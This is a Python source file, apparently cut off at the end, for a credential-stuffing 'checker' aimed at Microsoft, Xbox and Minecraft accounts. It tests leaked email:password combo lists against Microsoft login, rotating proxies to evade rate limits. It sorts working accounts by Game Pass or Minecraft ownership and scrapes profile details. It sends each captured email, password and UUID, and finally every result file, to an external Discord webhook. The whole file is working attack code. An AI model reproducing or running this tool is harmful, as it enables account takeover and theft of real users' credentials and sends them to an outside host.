import requests
import re
import os
import time
import threading
import random
import concurrent.futures
from colorama import init, Fore, Style
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs
import urllib3
import socks
import socket
import ipaddress
import configparser

# Inicializar Colorama y deshabilitar advertencias de urllib3
init(autoreset=True)
urllib3.disable_warnings()

# Variables globales
hits = 0
bad = 0
twofa = 0
minecraft = 0
gamepass = 0
gamepass_ultimate = 0
other = 0
checked = 0
cpm = 0
retries = 0
max_retries = 3
Combos = []
proxylist = []
bad_proxies = set()
proxytype = "none"
fname = ""
webhook_url = None

# URL para autenticación de Microsoft
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

# Logo ASCII
logo = Fore.GREEN + '''
  █████▒█    ██   ██████  ██▓ ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██   ▒ ██  ▓██▒▒██    ▒ ▓██▒▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒████ ░▓██  ▒██░░ ▓██▄   ▒██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▒  ░▓▓█  ░██░  ▒   ██▒░██░▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒█░   ▒▒█████▓ ▒██████▒▒░██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒ ░   ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░     ░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
          ░           ░   ░      ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                    ░                       ░                                BETA 2.5 
                                                    Made by danifusion                                                 \n'''

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, account_type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.account_type = account_type
        self.hypixel = None
        self.level = None
        self.first_login = None
        self.last_login = None
        self.optifine_cape = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.account_type}"
        if self.hypixel:
            message += f"\nHypixel: {self.hypixel}"
        if self.level:
            message += f"\nHypixel Level: {self.level}"
        if self.first_login:
            message += f"\nFirst Hypixel Login: {self.first_login}"
        if self.last_login:
            message += f"\nLast Hypixel Login: {self.last_login}"
        if self.optifine_cape:
            message += f"\nOptifine Cape: {self.optifine_cape}"
        return message + "\n============================\n"

    def hypixel(self):
        try:
            tx = requests.get(f"https://plancke.io/hypixel/player/stats/{self.name}", proxies=getproxy(), headers={'User-Agent': 'Mozilla/5.0'}, verify=False, timeout=10).text
            try:
                self.hypixel = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
            except:
                pass
            try:
                self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except:
                pass
            try:
                self.first_login = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except:
                pass
            try:
                self.last_login = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except:
                pass
        except:
            pass

    def optifine(self):
        try:
            txt = requests.get(f"http://s.optifine.net/capes/{self.name}.png", proxies=getproxy(), verify=False, timeout=10).text
            self.optifine_cape = "No" if "Not found" in txt else "Yes"
        except:
            self.optifine_cape = "Unknown"

    def handle(self):
        global hits, minecraft, gamepass, gamepass_ultimate, other
        print(Fore.GREEN + f"Hit: {self.name} | {self.email}:{self.password}")
        with open(f"results/{fname}/hits.txt", 'a', encoding='utf-8') as file:
            file.write(f"{self.email}:{self.password}\n")
        if self.account_type == "Minecraft":
            minecraft += 1
            print(Fore.GREEN + f"Minecraft: {self.email}:{self.password}")
            with open(f"results/{fname}/minecraft.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
        elif self.account_type == "Xbox Game Pass":
            gamepass += 1
            print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {self.email}:{self.password}")
            with open(f"results/{fname}/gamepass.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
        elif self.account_type == "Xbox Game Pass Ultimate":
            gamepass_ultimate += 1
            print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {self.email}:{self.password}")
            with open(f"results/{fname}/ultimate.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
        elif self.account_type == "Minecraft Bedrock":
            other += 1
            print(Fore.YELLOW + f"Minecraft Bedrock: {self.email}:{self.password}")
            with open(f"results/{fname}/bedrock.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
        elif self.account_type == "Minecraft Dungeons":
            other += 1
            print(Fore.YELLOW + f"Minecraft Dungeons: {self.email}:{self.password}")
            with open(f"results/{fname}/dungeons.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
        elif self.account_type == "Minecraft Legends":
            other += 1
            print(Fore.YELLOW + f"Minecraft Legends: {self.email}:{self.password}")
            with open(f"results/{fname}/legends.txt", 'a', encoding='utf-8') as file:
                file.write(f"{self.email}:{self.password}\n")
    
        # Enviar embed al webhook para cada hit
        if webhook_url:
            embed_data = {
                "embeds": [{
                    "title": "🎉 New Hit Detected! 🎉",
                    "color": 65280,
                    "fields": [
                        {"name": "Email", "value": self.email, "inline": False},
                        {"name": "Password", "value": self.password, "inline": False},
                        {"name": "Username", "value": self.name if self.name != "N/A" else "N/A", "inline": False},
                        {"name": "UUID", "value": self.uuid if self.uuid != "N/A" else "N/A", "inline": False},
                        {"name": "Capes", "value": self.capes if self.capes != "N/A" else "None", "inline": False},
                        {"name": "Account Type", "value": self.account_type, "inline": False}
                    ],
                    "footer": {"text": "Made by danifusion - BETA 2.0"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S+02:00', time.localtime())  # 10:56 AM CEST, 06/09/2025
                }]
            }
            # Añadir campos opcionales de Hypixel y Optifine si están disponibles
            if self.hypixel:
                embed_data["embeds"][0]["fields"].append({"name": "Hypixel", "value": self.hypixel, "inline": False})
            if self.level:
                embed_data["embeds"][0]["fields"].append({"name": "Hypixel Level", "value": self.level, "inline": False})
            if self.first_login:
                embed_data["embeds"][0]["fields"].append({"name": "First Login", "value": self.first_login, "inline": False})
            if self.last_login:
                embed_data["embeds"][0]["fields"].append({"name": "Last Login", "value": self.last_login, "inline": False})
            if self.optifine_cape:
                embed_data["embeds"][0]["fields"].append({"name": "Optifine Cape", "value": self.optifine_cape, "inline": False})

            try:
                response = requests.post(webhook_url, json=embed_data, timeout=10)
                if response.status_code not in [200, 204]:
                    print(Fore.YELLOW + f"Failed to send hit embed to webhook. Status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(Fore.YELLOW + f"Error sending hit embed to webhook: {str(e)}")

        try:
            self.hypixel()
        except:
            pass
        try:
            self.optifine()
        except:
            pass
        with open(f"results/{fname}/capture.txt", 'a', encoding='utf-8') as file:
            file.write(self.builder())

def validate_proxy(proxy):
    """Valida el formato de un proxy y emite advertencia para puerto 80."""
    try:
        parts = proxy.split(':')
        if len(parts) == 2:
            ip, port = parts
            ipaddress.ip_address(ip)
            port = int(port)
            if not (1 <= port <= 65535):
                print(Fore.YELLOW + f"Warning: Proxy {proxy} uses invalid port, skipping.")
                return False
            if port == 80:
                print(Fore.YELLOW + f"Warning: Proxy {proxy} uses port 80, which may cause issues with HTTPS. Proceeding with test.")
            return {"ip": ip, "port": port, "type": "direct"}
        elif len(parts) == 4:
            ip, port, user, password = parts
            ipaddress.ip_address(ip)
            port = int(port)
            if not (1 <= port <= 65535):
                print(Fore.YELLOW + f"Warning: Proxy {proxy} uses invalid port, skipping.")
                return False
            if port == 80:
                print(Fore.YELLOW + f"Warning: Proxy {proxy} uses port 80, which may cause issues with HTTPS. Proceeding with test.")
            return {"ip": ip, "port": port, "user": user, "password": password, "type": "auth"}
        return False
    except ValueError:
        print(Fore.YELLOW + f"Invalid proxy format: {proxy}")
        return False

def test_proxy(proxy_dict, proxy_type):
    """Prueba si un proxy es funcional con una solicitud a login.live.com."""
    try:
        if proxy_dict["type"] == "direct":
            proxies = {
                'http': f"{proxy_type}://{proxy_dict['ip']}:{proxy_dict['port']}",
                'https': f"{proxy_type}://{proxy_dict['ip']}:{proxy_dict['port']}"
            }
        elif proxy_dict["type"] == "auth":
            proxies = {
                'http': f"{proxy_type}://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}",
                'https': f"{proxy_type}://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}"
            }
        response = requests.get(sFTTag_url, proxies=proxies, timeout=10, verify=False)
        if response.status_code == 200:
            return True
        return False
    except requests.exceptions.RequestException as e:
        if "400 Bad Request" in str(e) or "Connection refused" in str(e):
            print(Fore.YELLOW + f"Proxy failed: {proxy_dict['ip']}:{proxy_dict['port']} - {str(e)}")
        return False

def getproxy():
    global proxylist, bad_proxies, proxytype
    if not proxylist or proxytype == "none":
        return None
    available_proxies = [p for p in proxylist if p not in bad_proxies]
    if not available_proxies:
        print(Fore.YELLOW + "No valid proxies available, switching to proxyless")
        proxytype = "none"
        return None
    proxy = random.choice(available_proxies)
    proxy_dict = validate_proxy(proxy)
    if not proxy_dict:
        bad_proxies.add(proxy)
        return getproxy()  # Intentar con otro proxy
    if not test_proxy(proxy_dict, proxytype):
        bad_proxies.add(proxy)
        return getproxy()  # Intentar con otro proxy si falla la prueba
    if proxytype == "http":
        return {
            'http': f"http://{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"http://{proxy_dict['ip']}:{proxy_dict['port']}"
        } if proxy_dict["type"] == "direct" else {
            'http': f"http://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"http://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}"
        }
    elif proxytype == "socks4":
        return {
            'http': f"socks4://{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"socks4://{proxy_dict['ip']}:{proxy_dict['port']}"
        } if proxy_dict["type"] == "direct" else {
            'http': f"socks4://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"socks4://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}"
        }
    elif proxytype == "socks5":
        return {
            'http': f"socks5://{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"socks5://{proxy_dict['ip']}:{proxy_dict['port']}"
        } if proxy_dict["type"] == "direct" else {
            'http': f"socks5://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}",
            'https': f"socks5://{proxy_dict['user']}:{proxy_dict['password']}@{proxy_dict['ip']}:{proxy_dict['port']}"
        }
    return None

def load_accounts():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file', filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    if filename is None:
        print(Fore.RED + "Invalid File.")
        time.sleep(2)
        load_accounts()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r', encoding='utf-8') as file:
                lines = file.readlines()
                Combos = list(set(line.strip() for line in lines if ':' in line))
                print(Fore.CYAN + f"[{len(lines) - len(Combos)}] Dupes Removed.")
                print(Fore.CYAN + f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.RED + "Your file is probably harmed.")
            time.sleep(2)
            load_accounts()

def load_proxies():
    global proxylist, proxytype, bad_proxies
    if proxytype == "none":
        print(Fore.CYAN + "Running proxyless.")
        return
    filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file', filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    if filename is None:
        print(Fore.RED + "Invalid File.")
        time.sleep(2)
        load_proxies()
    else:
        try:
            with open(filename.name, 'r', encoding='utf-8', errors='ignore') as file:
                lines = [line.strip() for line in file if line.strip()]
                proxylist = [line for line in lines if validate_proxy(line)]
            if not proxylist:
                print(Fore.YELLOW + "No valid proxies found in proxies.txt, switching to proxyless.")
                proxytype = "none"
                return
            valid_proxies = []
            for proxy in proxylist:
                proxy_dict = validate_proxy(proxy)
                if test_proxy(proxy_dict, proxytype):
                    valid_proxies.append(proxy)
                else:
                    bad_proxies.add(proxy)
            proxylist = valid_proxies
            if not proxylist:
                print(Fore.YELLOW + "No functional proxies found, switching to proxyless.")
                proxytype = "none"
            else:
                print(Fore.CYAN + f"Loaded [{len(proxylist)}] valid proxies.")
            time.sleep(2)
        except:
            print(Fore.RED + "Your file is probably harmed.")
            time.sleep(2)
            load_proxies()

def get_urlPost_sFTTag(session):
    global retries, proxytype, bad_proxies
    tries = 0
    while tries < max_retries:
        try:
            r = session.get(sFTTag_url, timeout=30, verify=False)
            if r.status_code == 200:
                text = r.text
                match = re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sFTTag = match.group(1)
                    match = re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match:
                        return match.group(1), sFTTag, session
            elif r.status_code == 429:
                print(Fore.YELLOW + f"Rate limit (429) in get_urlPost_sFTTag, retrying after delay...")
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(15)
                continue
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
        except requests.exceptions.RequestException as e:
            if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                if session.proxies:
                    proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                    bad_proxies.add(proxy_str)
                session.proxies = getproxy()
            else:
                print(Fore.YELLOW + f"Retry error in get_urlPost_sFTTag: {str(e)}")
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
    if proxylist and proxytype != "none" and len(bad_proxies) >= len(proxylist):
        print(Fore.YELLOW + "All proxies failed, switching to proxyless.")
        proxytype = "none"
        session.proxies = None
        return get_urlPost_sFTTag(session)
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries
    tries = 0
    while tries < max_retries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=30, verify=False)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
                else:
                    print(Fore.YELLOW + f"Token error: No valid access token received for {email}")
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True, verify=False, timeout=30)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True, verify=False, timeout=30)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa += 1
                checked += 1
                cpm += 1
                print(Fore.MAGENTA + f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a', encoding='utf-8') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad += 1
                checked += 1
                cpm += 1
                print(Fore.RED + f"Bad: {email}:{password}")
                with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif login_request.status_code == 429:
                print(Fore.YELLOW + f"Rate limit (429) in get_xbox_rps, retrying after delay...")
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(15)
                continue
            else:
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(1)
        except requests.exceptions.RequestException as e:
            if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                if session.proxies:
                    proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                    bad_proxies.add(proxy_str)
                session.proxies = getproxy()
            else:
                print(Fore.YELLOW + f"Retry error in get_xbox_rps: {str(e)}")
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
    bad += 1
    checked += 1
    cpm += 1
    print(Fore.RED + f"Bad: {email}:{password}")
    with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
        file.write(f"{email}:{password}\n")
    return "None", session

def mc_token(session, uhs, xsts_token):
    global retries
    tries = 0
    while tries < max_retries:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=30, verify=False)
            if mc_login.status_code == 200:
                return mc_login.json().get('access_token')
            elif mc_login.status_code == 429:
                print(Fore.YELLOW + f"Rate limit (429) in mc_token, retrying after delay...")
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(15)
                continue
            else:
                return None
        except requests.exceptions.RequestException as e:
            if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                if session.proxies:
                    proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                    bad_proxies.add(proxy_str)
                session.proxies = getproxy()
            else:
                print(Fore.YELLOW + f"Retry error in mc_token: {str(e)}")
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
    return None

def check_mc_and_gamepass(session, email, password, token):
    global retries, minecraft, gamepass, gamepass_ultimate, other, checked, cpm, hits
    tries = 0
    while tries < max_retries:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=30)
            if checkrq.status_code == 200:
                checked += 1
                cpm += 1
                hits += 1  # Incrementa hits para cualquier cuenta autenticada
                print(Fore.GREEN + f"Hit: {email}:{password}")
                with open(f"results/{fname}/hits.txt", 'a', encoding='utf-8') as f:
                    f.write(f"{email}:{password}\n")
                if 'product_game_pass_ultimate' in checkrq.text:
                    gamepass_ultimate += 1
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
                    with open(f"results/{fname}/ultimate.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                    return True
                elif 'product_game_pass_pc' in checkrq.text:
                    gamepass += 1
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password}")
                    with open(f"results/{fname}/gamepass.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    capture_mc(token, session, email, password, "Xbox Game Pass")
                    return True
                elif '"product_minecraft"' in checkrq.text:
                    minecraft += 1
                    print(Fore.GREEN + f"Minecraft: {email}:{password}")
                    with open(f"results/{fname}/minecraft.txt", 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    capture_mc(token, session, email, password, "Minecraft")
                    return True
                else:
                    others = []
                    if 'product_minecraft_bedrock' in checkrq.text:
                        others.append("Minecraft Bedrock")
                    if 'product_legends' in checkrq.text:
                        others.append("Minecraft Legends")
                    if 'product_dungeons' in checkrq.text:
                        others.append("Minecraft Dungeons")
                    if others:
                        other += 1
                        if "Minecraft Bedrock" in others:
                            print(Fore.YELLOW + f"Minecraft Bedrock: {email}:{password}")
                            with open(f"results/{fname}/bedrock.txt", 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}\n")
                            capture_mc(token, session, email, password, "Minecraft Bedrock")
                        if "Minecraft Dungeons" in others:
                            print(Fore.YELLOW + f"Minecraft Dungeons: {email}:{password}")
                            with open(f"results/{fname}/dungeons.txt", 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}\n")
                            capture_mc(token, session, email, password, "Minecraft Dungeons")
                        if "Minecraft Legends" in others:
                            print(Fore.YELLOW + f"Minecraft Legends: {email}:{password}")
                            with open(f"results/{fname}/legends.txt", 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}\n")
                            capture_mc(token, session, email, password, "Minecraft Legends")
                        return True
                    else:
                        capture_mc(token, session, email, password, "Hit")  # Hit genérico sin productos
                        return True
            elif checkrq.status_code == 429:
                print(Fore.YELLOW + f"Rate limit (429) in check_mc_and_gamepass, retrying after delay...")
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(15)
                continue
            else:
                return False
        except requests.exceptions.RequestException as e:
            if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                if session.proxies:
                    proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                    bad_proxies.add(proxy_str)
                session.proxies = getproxy()
            else:
                print(Fore.YELLOW + f"Retry error in check_mc_and_gamepass: {str(e)}")
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
    return False

def capture_mc(access_token, session, email, password, account_type):
    global retries
    tries = 0
    while tries < max_retries:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=30)
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])]) or "None"
                name = r.json().get('name', 'N/A')
                uuid = r.json().get('id', 'N/A')
                CAPTURE = Capture(email, password, name, capes, uuid, access_token, account_type)
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                print(Fore.YELLOW + f"Rate limit (429) in capture_mc, retrying after delay...")
                retries += 1
                session.proxies = getproxy()
                tries += 1
                time.sleep(15)
                continue
            else:
                CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", account_type)
                CAPTURE.handle()
                break
        except requests.exceptions.RequestException as e:
            if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                if session.proxies:
                    proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                    bad_proxies.add(proxy_str)
                session.proxies = getproxy()
            else:
                print(Fore.YELLOW + f"Retry error in capture_mc: {str(e)}")
            retries += 1
            session.proxies = getproxy()
            tries += 1
            time.sleep(1)
    if tries >= max_retries:
        CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", account_type)
        CAPTURE.handle()

def authenticate(email, password):
    global retries, bad, checked, cpm
    session = requests.Session()
    session.verify = False
    session.proxies = getproxy()
    global_tries = 0
    max_global_tries = 5
    while global_tries < max_global_tries:
        try:
            urlPost, sFTTag, session = get_urlPost_sFTTag(session)
            if not urlPost or not sFTTag:
                bad += 1
                checked += 1
                cpm += 1
                print(Fore.RED + f"Bad: {email}:{password}")
                with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                    file.write(f"{email}:{password}\n")
                return
            token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
            if token == "None":
                return
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=30, verify=False)
                if xbox_login.status_code == 200:
                    js = xbox_login.json()
                    xbox_token = js.get('Token')
                    if xbox_token:
                        uhs = js['DisplayClaims']['xui'][0]['uhs']
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=30, verify=False)
                        if xsts.status_code == 200:
                            js = xsts.json()
                            xsts_token = js.get('Token')
                            if xsts_token:
                                access_token = mc_token(session, uhs, xsts_token)
                                if access_token:
                                    check_mc_and_gamepass(session, email, password, access_token)
                                else:
                                    bad += 1
                                    checked += 1
                                    cpm += 1
                                    print(Fore.RED + f"Bad: {email}:{password}")
                                    with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                                        file.write(f"{email}:{password}\n")
                            else:
                                bad += 1
                                checked += 1
                                cpm += 1
                                print(Fore.RED + f"Bad: {email}:{password}")
                                with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                                    file.write(f"{email}:{password}\n")
                        elif xsts.status_code == 429:
                            print(Fore.YELLOW + f"Rate limit (429) in xsts, retrying after delay...")
                            retries += 1
                            session.proxies = getproxy()
                            global_tries += 1
                            time.sleep(15)
                            continue
                    else:
                        bad += 1
                        checked += 1
                        cpm += 1
                        print(Fore.RED + f"Bad: {email}:{password}")
                        with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                            file.write(f"{email}:{password}\n")
                elif xbox_login.status_code == 429:
                    print(Fore.YELLOW + f"Rate limit (429) in xbox_login, retrying after delay...")
                    retries += 1
                    session.proxies = getproxy()
                    global_tries += 1
                    time.sleep(15)
                    continue
                else:
                    bad += 1
                    checked += 1
                    cpm += 1
                    print(Fore.RED + f"Bad: {email}:{password}")
                    with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
                        file.write(f"{email}:{password}\n")
            except requests.exceptions.RequestException as e:
                if "400 Bad Request" in str(e) or "Connection refused" in str(e):
                    if session.proxies:
                        proxy_str = session.proxies.get('https', '').split('://')[-1].split('@')[-1]
                        bad_proxies.add(proxy_str)
                    session.proxies = getproxy()
                else:
                    print(Fore.YELLOW + f"Error in authenticate: {str(e)}")
                retries += 1
                global_tries += 1
                time.sleep(1)
        except Exception as e:
            print(Fore.YELLOW + f"Unexpected error in authenticate: {str(e)}")
            retries += 1
            global_tries += 1
            time.sleep(1)
    bad += 1
    checked += 1
    cpm += 1
    print(Fore.RED + f"Bad: {email}:{password}")
    with open(f"results/{fname}/bad.txt", 'a', encoding='utf-8') as file:
        file.write(f"{email}:{password}\n")
    session.close()

def cuiscreen():
    global cpm
    os.system('cls')
    cpm_last = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}/{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{twofa}] 2FA")
    print(f" [{minecraft}] Minecraft")
    print(f" [{gamepass}] Xbox Game Pass")
    print(f" [{gamepass_ultimate}] Xbox Game Pass Ultimate")
    print(f" [{other}] Other")
    print(f" [{retries}] Retries")
    print(f" [{cpm_last*60}] CPM")
    time.sleep(1)
    if checked < len(Combos):
        threading.Thread(target=cuiscreen).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print(Fore.LIGHTGREEN_EX + "Finished Checking!")
    print(f"Hits: {hits}")
    print(f"Bad: {bad}")
    print(f"2FA: {twofa}")
    print(f"Minecraft: {minecraft}")
    print(f"Xbox Game Pass: {gamepass}")
    print(f"Xbox Game Pass Ultimate: {gamepass_ultimate}")
    print(f"Other: {other}")
    print(f"Retries: {retries}")
    print(Fore.RED + "Press Enter to exit.")
    
    # Enviar resultados al webhook si está configurado
    if webhook_url:
        results = {
            "status": "completed",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
            "stats": {
                "hits": hits,
                "bad": bad,
                "twofa": twofa,
                "minecraft": minecraft,
                "gamepass": gamepass,
                "gamepass_ultimate": gamepass_ultimate,
                "other": other,
                "retries": retries,
                "checked": checked,
                "total_combos": len(Combos)
            },
            "files": {}
        }
        for filename in ["hits.txt", "2fa.txt", "minecraft.txt", "gamepass.txt", "ultimate.txt", "bad.txt", "bedrock.txt", "dungeons.txt", "legends.txt", "capture.txt"]:
            file_path = f"results/{fname}/{filename}"
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    results["files"][filename] = f.read().strip()
        
        try:
            response = requests.post(webhook_url, json=results, timeout=10)
            if response.status_code == 200 or response.status_code == 204:
                print(Fore.GREEN + "Results successfully sent to webhook.")
            else:
                print(Fore.YELLOW + f"Failed to send results to webhook. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
